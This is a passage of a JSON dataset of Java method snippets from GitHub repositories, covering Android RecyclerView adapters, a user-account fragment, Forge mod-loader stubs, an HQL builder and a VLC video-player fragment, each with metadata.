\u4e0d\u80fd\u6dfb\u52a0\u540c\u4e00\u4e2aView\u5bf9\u8c61\uff0c\u5426\u5219\u4f1a\u5bfc\u81f4RecyclerView\u590d\u7528\u5f02\u5e38\n            if (!mFooterViews.contains(view) && !mHeaderViews.contains(view)) {\n                adjustSpanSize(mRecyclerView, this, mRealAdapter);\n                mFooterViews.add(view);\n                notifyDataSetChanged();\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33752, "method_name": "removeFooterView", "class_name": "WrapRecyclerAdapter", "params": ["View"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void removeFooterView(View view) {\n            if (mFooterViews.remove(view)) {\n                notifyDataSetChanged();\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33753, "method_name": "getHeaderViewsCount", "class_name": "WrapRecyclerAdapter", "params": [], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "        private int getHeaderViewsCount() {\n            return mHeaderViews.size();\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33754, "method_name": "getFooterViewsCount", "class_name": "WrapRecyclerAdapter", "params": [], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "        private int getFooterViewsCount() {\n            return mFooterViews.size();\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33755, "method_name": "getHeaderViews", "class_name": "WrapRecyclerAdapter", "params": [], "throws": null, "modifiers": ["private"], "return_type": "List<View>", "snippet": "        private List<View> getHeaderViews() {\n            return mHeaderViews;\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33756, "method_name": "getFooterViews", "class_name": "WrapRecyclerAdapter", "params": [], "throws": null, "modifiers": ["private"], "return_type": "List<View>", "snippet": "        private List<View> getFooterViews() {\n            return mFooterViews;\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33757, "method_name": "adjustSpanSize", "class_name": "WrapRecyclerAdapter", "params": ["RecyclerView", "WrapRecyclerAdapter", "RecyclerView"], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "        private static void adjustSpanSize(RecyclerView recyclerView, final WrapRecyclerAdapter wrapAdapter, final RecyclerView.Adapter realAdapter) {\n\n            if (recyclerView == null || wrapAdapter == null || realAdapter == null) {\n                return;\n            }\n\n            final RecyclerView.LayoutManager layoutManager = recyclerView.getLayoutManager();\n            if (layoutManager instanceof GridLayoutManager) {\n                ((GridLayoutManager) layoutManager).setSpanSizeLookup(new GridLayoutManager.SpanSizeLookup() {\n\n                    @Override\n                    public int getSpanSize(int position) {\n                        return (position < wrapAdapter.getHeaderViewsCount()\n                                || position >= wrapAdapter.getHeaderViewsCount() + realAdapter.getItemCount())\n                                ? ((GridLayoutManager) layoutManager).getSpanCount() : 1;\n                    }\n                });\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33758, "method_name": "onChanged", "class_name": "WrapAdapterDataObserver", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onChanged() {\n            mWrapAdapter.notifyDataSetChanged();\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33759, "method_name": "onItemRangeChanged", "class_name": "WrapAdapterDataObserver", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onItemRangeChanged(int positionStart, int itemCount) {\n            mWrapAdapter.notifyItemRangeChanged(mWrapAdapter.getHeaderViewsCount() + positionStart, itemCount);\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33760, "method_name": "onItemRangeChanged", "class_name": "WrapAdapterDataObserver", "params": ["int", "int", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onItemRangeChanged(int positionStart, int itemCount, Object payload) {\n            onItemRangeChanged(mWrapAdapter.getHeaderViewsCount() + positionStart, itemCount);\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33761, "method_name": "onItemRangeInserted", "class_name": "WrapAdapterDataObserver", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onItemRangeInserted(int positionStart, int itemCount) {\n            mWrapAdapter.notifyItemRangeInserted(mWrapAdapter.getHeaderViewsCount() + positionStart, itemCount);\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33762, "method_name": "onItemRangeRemoved", "class_name": "WrapAdapterDataObserver", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onItemRangeRemoved(int positionStart, int itemCount) {\n            mWrapAdapter.notifyItemRangeRemoved(mWrapAdapter.getHeaderViewsCount() + positionStart, itemCount);\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33763, "method_name": "onItemRangeMoved", "class_name": "WrapAdapterDataObserver", "params": ["int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onItemRangeMoved(int fromPosition, int toPosition, int itemCount) {\n            mWrapAdapter.notifyItemMoved(mWrapAdapter.getHeaderViewsCount() + fromPosition, toPosition);\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/layout/WrapRecyclerView.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private", "final", "static"]}}, {"id": 33764, "method_name": "newInstance", "class_name": "user_account_view", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "user_account_view", "snippet": "    public static user_account_view newInstance() {\n        user_account_view fragment = new user_account_view();\n        return fragment;\n    }", "url": "https://raw.githubusercontent.com/sachin2912/torripo/master/app/src/main/java/com/example/torripo/user_account_view.java", "stars": "2", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 33765, "method_name": "onCreate", "class_name": "user_account_view", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        sharedPreferences=getActivity().getSharedPreferences(\"torripo_login\",Context.MODE_PRIVATE);\n        uname_1 = sharedPreferences.getString(\"uname\",\"none\");\n\n    }", "url": "https://raw.githubusercontent.com/sachin2912/torripo/master/app/src/main/java/com/example/torripo/user_account_view.java", "stars": "2", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 33766, "method_name": "onCreateView", "class_name": "user_account_view", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(LayoutInflater inflater, ViewGroup container,\n                             Bundle savedInstanceState) {\n        // Inflate the layout for this fragment\n        if (!((MainActivity)getActivity()).isNetworkAvailable(getContext()))\n        {\n            Toast.makeText(getContext(),\"No Internet Connectivity\",Toast.LENGTH_LONG).show();\n            getActivity().finish();\n        }\n        View view=inflater.inflate(R.layout.fragment_user_account_view, container, false);\n        uname=view.findViewById(R.id.uname);\n        user_name=view.findViewById(R.id.name);\n        user_email=view.findViewById(R.id.email);\n        pbar=view.findViewById(R.id.progress);\n        main_user = view.findViewById(R.id.user_main);\n        Retrofit retrofit = new Retrofit.Builder().baseUrl(APIUrl.BASE_URL).\n                addConverterFactory(GsonConverterFactory.create()).build();\n        APIService service = retrofit.create(APIService.class);\n        Call<user_detail> call = service.getuserdetail(\"user_details\",uname_1);\n        call.enqueue(new Callback<user_detail>() {\n            @Override\n            public void onResponse(Call<user_detail> call, Response<user_detail> response) {\n                user_1 = response.body();\n                pbar.setVisibility(View.GONE);\n                main_user.setVisibility(View.VISIBLE);\n                uname.setText(\"Username :  \"+user_1.uname);\n                user_name.setText(\"Name :  \"+user_1.name);\n                user_email.setText(\"Email :  \"+user_1.email);\n            }\n\n            @Override\n            public void onFailure(Call<user_detail> call, Throwable t) {\n                Log.e(\"Error\", t.getMessage());\n            }\n        });\n\n\n        return view;\n    }", "url": "https://raw.githubusercontent.com/sachin2912/torripo/master/app/src/main/java/com/example/torripo/user_account_view.java", "stars": "2", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 33767, "method_name": "onButtonPressed", "class_name": "user_account_view", "params": ["Uri"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onButtonPressed(Uri uri) {\n\n    }", "url": "https://raw.githubusercontent.com/sachin2912/torripo/master/app/src/main/java/com/example/torripo/user_account_view.java", "stars": "2", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 33768, "method_name": "onAttach", "class_name": "user_account_view", "params": ["Context"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onAttach(Context context) {\n        super.onAttach(context);\n\n    }", "url": "https://raw.githubusercontent.com/sachin2912/torripo/master/app/src/main/java/com/example/torripo/user_account_view.java", "stars": "2", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 33769, "method_name": "onDetach", "class_name": "user_account_view", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDetach() {\n        super.onDetach();\n        }", "url": "https://raw.githubusercontent.com/sachin2912/torripo/master/app/src/main/java/com/example/torripo/user_account_view.java", "stars": "2", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 33770, "method_name": "getASMTransformerClass", "class_name": "MercuryLoader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String[] getASMTransformerClass() {\n        return new String[0];\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/loader/MercuryLoader.java", "stars": "12", "class_props": {"extends": null, "implements": ["IFMLLoadingPlugin"], "modifiers": ["public"]}}, {"id": 33771, "method_name": "getModContainerClass", "class_name": "MercuryLoader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getModContainerClass() {\n        return null;\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/loader/MercuryLoader.java", "stars": "12", "class_props": {"extends": null, "implements": ["IFMLLoadingPlugin"], "modifiers": ["public"]}}, {"id": 33772, "method_name": "getSetupClass", "class_name": "MercuryLoader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSetupClass() {\n        return null;\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/loader/MercuryLoader.java", "stars": "12", "class_props": {"extends": null, "implements": ["IFMLLoadingPlugin"], "modifiers": ["public"]}}, {"id": 33773, "method_name": "injectData", "class_name": "MercuryLoader", "params": ["Map<String,Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void injectData(Map<String, Object> data) { }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/loader/MercuryLoader.java", "stars": "12", "class_props": {"extends": null, "implements": ["IFMLLoadingPlugin"], "modifiers": ["public"]}}, {"id": 33774, "method_name": "getAccessTransformerClass", "class_name": "MercuryLoader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getAccessTransformerClass() {\n        return MercuryAccessTransformer.class.getName();\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/loader/MercuryLoader.java", "stars": "12", "class_props": {"extends": null, "implements": ["IFMLLoadingPlugin"], "modifiers": ["public"]}}, {"id": 33775, "method_name": "toHQL", "class_name": "DropPartitionHQL", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String toHQL() {\n    String exists = ifExists ? \"IF EXISTS \" : \"\";\n\n    return \"ALTER TABLE \" + table + \" DROP \" + exists + \"PARTITION (\"\n        + partition + \"='\" + value + \"');\";\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/hiveutils/azkaban/hive/actions/DropPartitionHQL.java", "stars": "18", "class_props": {"extends": null, "implements": ["HQL"], "modifiers": []}}, {"id": 33776, "method_name": "LibVLC", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["private", "static"], "return_type": "LibVLC", "snippet": "    private static LibVLC LibVLC() {\n        return VLCInstance.get(ButterApplication.getAppContext());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33777, "method_name": "onAttach", "class_name": "BaseVideoPlayerFragment", "params": ["Context"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onAttach(Context context) {\n        super.onAttach(context);\n        if (context instanceof Callback) mCallback = (Callback) context;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33778, "method_name": "onCreate", "class_name": "BaseVideoPlayerFragment", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setRetainInstance(true);\n        setHasOptionsMenu(true);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33779, "method_name": "onCreateView", "class_name": "BaseVideoPlayerFragment", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {\n        return super.onCreateView(inflater, container, savedInstanceState);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33780, "method_name": "onViewCreated", "class_name": "BaseVideoPlayerFragment", "params": ["View", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onViewCreated(View view, @Nullable Bundle savedInstanceState) {\n        super.onViewCreated(view, savedInstanceState);\n        mRootView = view;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33781, "method_name": "onActivityCreated", "class_name": "BaseVideoPlayerFragment", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityCreated(@Nullable Bundle savedInstanceState) {\n        super.onActivityCreated(savedInstanceState);\n\n        if (getActivity() instanceof Callback && mCallback == null) {\n            mCallback = (Callback) getActivity();\n        }\n\n        mResumePosition = mCallback.getResumePosition();\n        PrefUtils.save(getActivity(), RESUME_POSITION, mResumePosition);\n\n        if (!VLCInstance.hasCompatibleCPU(getContext())) {\n            getActivity().finish();\n            return;\n        }\n\n        StreamInfo streamInfo = mCallback.getInfo();\n\n        if (streamInfo == null){\n            getActivity().finish();\n            return;\n        }\n\n        mMedia = streamInfo.getMedia();\n\n        mLibVLC = LibVLC();\n        mLibVLC.setOnHardwareAccelerationError(this);\n\n        mMediaPlayer = new MediaPlayer(mLibVLC);\n        mMediaPlayer.setEventListener(this);\n\n        if (mCallback.getService() != null) {\n            mCallback.getService().addListener(this);\n        }\n\n        setProgressVisible(true);\n\n        if (null == streamInfo.getSubtitleLanguage()) {\n            // Get selected default subtitle\n            String defaultSubtitle = PrefUtils.get(\n                    getActivity(),\n                    Prefs.SUBTITLE_DEFAULT,\n                    SubsProvider.SUBTITLE_LANGUAGE_NONE);\n            streamInfo.setSubtitleLanguage(defaultSubtitle);\n            mCurrentSubsLang = defaultSubtitle;\n            Timber.d(\"Using default subtitle: \" + mCurrentSubsLang);\n        }\n\n        if (!streamInfo.getSubtitleLanguage().equals(SubsProvider.SUBTITLE_LANGUAGE_NONE)) {\n            Timber.d(\"Download default subtitle\");\n            mCurrentSubsLang = streamInfo.getSubtitleLanguage();\n            loadOrDownloadSubtitle();\n        }\n\n        updateSubtitleSize(PrefUtils.get(getActivity(), Prefs.SUBTITLE_SIZE, getResources().getInteger(R.integer.player_subtitles_default_text_size)));\n\n        prepareVlcVout();\n        if(mMediaReady)\n            loadMedia();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33782, "method_name": "onResume", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onResume() {\n        super.onResume();\n\n        prepareVlcVout();\n        BeamManager.getInstance(getActivity()).addDeviceListener(mDeviceListener);\n        onProgressChanged(PrefUtils.get(getActivity(), RESUME_POSITION, mResumePosition), mDuration);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33783, "method_name": "onPause", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onPause() {\n        super.onPause();\n\n        saveVideoCurrentTime();\n        mMediaPlayer.stop();\n\n        final IVLCVout vlcout = mMediaPlayer.getVLCVout();\n        vlcout.removeCallback(this);\n        vlcout.detachViews();\n\n        BeamManager.getInstance(getActivity()).removeDeviceListener(mDeviceListener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33784, "method_name": "onDestroy", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDestroy() {\n        super.onDestroy();\n\n        PrefUtils.save(getActivity(), RESUME_POSITION, 0);\n\n        mMediaPlayer.release();\n        mLibVLC.release();\n\n        if (mCallback.getService() != null) {\n            mCallback.getService().removeListener(this);\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33785, "method_name": "onMediaReady", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onMediaReady() {\n        if(!mMediaReady) {\n            mMediaReady = true;\n        }\n        if(mLibVLC != null) {\n            loadMedia();\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33786, "method_name": "disableHardwareAcceleration", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void disableHardwareAcceleration() {\n        mDisabledHardwareAcceleration = true;\n        saveVideoCurrentTime();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33787, "method_name": "loadMedia", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void loadMedia() {\n        StreamInfo streamInfo = mCallback.getInfo();\n\n        String videoLocation;\n        if (TextUtils.isEmpty(streamInfo.getVideoLocation())) {\n            Toast.makeText(getActivity(), \"Error loading media\", Toast.LENGTH_LONG).show();\n            getActivity().finish();\n            return;\n        }\n        else {\n            videoLocation = streamInfo.getVideoLocation();\n            if (!videoLocation.startsWith(\"file://\") && !videoLocation.startsWith(\"http://\") && !videoLocation.startsWith(\"https://\")) {\n                videoLocation = \"file://\" + videoLocation;\n            }\n        }\n\n        int flags = mDisabledHardwareAcceleration ? VLCOptions.MEDIA_NO_HWACCEL : 0;\n        flags = flags | VLCOptions.MEDIA_VIDEO;\n\n        org.videolan.libvlc.Media media = new org.videolan.libvlc.Media(mLibVLC, Uri.parse(videoLocation));\n        VLCOptions.setMediaOptions(media, getActivity(), flags);\n\n        mMediaPlayer.setMedia(media);\n\n        long resumeFrom = PrefUtils.get(getActivity(), RESUME_POSITION, mResumePosition);\n        if (resumeFrom > 0) {\n            mMediaPlayer.setTime(resumeFrom);\n        }\n\n        mDuration = mMediaPlayer.getLength();\n        mMediaPlayer.play();\n        mEnded = false;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33788, "method_name": "setProgressVisible", "class_name": "BaseVideoPlayerFragment", "params": ["boolean"], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "void", "snippet": "    protected abstract void setProgressVisible(boolean visible);\n\n    protected abstract void showOverlay();\n\n    protected abstract void showPlayerInfo(String info);\n\n    protected abstract void onProgressChanged(long currentTime, long duration);\n\n    protected abstract void updatePlayPauseState();\n\n    protected abstract void onErrorEncountered();\n\n    protected abstract void onHardwareAccelerationError();\n\n    protected abstract void showTimedCaptionText(Caption text);\n\n    protected abstract SurfaceView getVideoSurface();\n\n    protected void setSeeking(boolean seeking) {\n        mSeeking = seeking;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33789, "method_name": "showOverlay", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "void", "snippet": "    protected abstract void showOverlay();\n\n    protected abstract void showPlayerInfo(String info);\n\n    protected abstract void onProgressChanged(long currentTime, long duration);\n\n    protected abstract void updatePlayPauseState();\n\n    protected abstract void onErrorEncountered();\n\n    protected abstract void onHardwareAccelerationError();\n\n    protected abstract void showTimedCaptionText(Caption text);\n\n    protected abstract SurfaceView getVideoSurface();\n\n    protected void setSeeking(boolean seeking) {\n        mSeeking = seeking;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33790, "method_name": "showPlayerInfo", "class_name": "BaseVideoPlayerFragment", "params": ["String"], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "void", "snippet": "    protected abstract void showPlayerInfo(String info);\n\n    protected abstract void onProgressChanged(long currentTime, long duration);\n\n    protected abstract void updatePlayPauseState();\n\n    protected abstract void onErrorEncountered();\n\n    protected abstract void onHardwareAccelerationError();\n\n    protected abstract void showTimedCaptionText(Caption text);\n\n    protected abstract SurfaceView getVideoSurface();\n\n    protected void setSeeking(boolean seeking) {\n        mSeeking = seeking;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33791, "method_name": "onProgressChanged", "class_name": "BaseVideoPlayerFragment", "params": ["long", "long"], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "void", "snippet": "    protected abstract void onProgressChanged(long currentTime, long duration);\n\n    protected abstract void updatePlayPauseState();\n\n    protected abstract void onErrorEncountered();\n\n    protected abstract void onHardwareAccelerationError();\n\n    protected abstract void showTimedCaptionText(Caption text);\n\n    protected abstract SurfaceView getVideoSurface();\n\n    protected void setSeeking(boolean seeking) {\n        mSeeking = seeking;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33792, "method_name": "updatePlayPauseState", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "void", "snippet": "    protected abstract void updatePlayPauseState();\n\n    protected abstract void onErrorEncountered();\n\n    protected abstract void onHardwareAccelerationError();\n\n    protected abstract void showTimedCaptionText(Caption text);\n\n    protected abstract SurfaceView getVideoSurface();\n\n    protected void setSeeking(boolean seeking) {\n        mSeeking = seeking;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33793, "method_name": "onErrorEncountered", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "void", "snippet": "    protected abstract void onErrorEncountered();\n\n    protected abstract void onHardwareAccelerationError();\n\n    protected abstract void showTimedCaptionText(Caption text);\n\n    protected abstract SurfaceView getVideoSurface();\n\n    protected void setSeeking(boolean seeking) {\n        mSeeking = seeking;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", 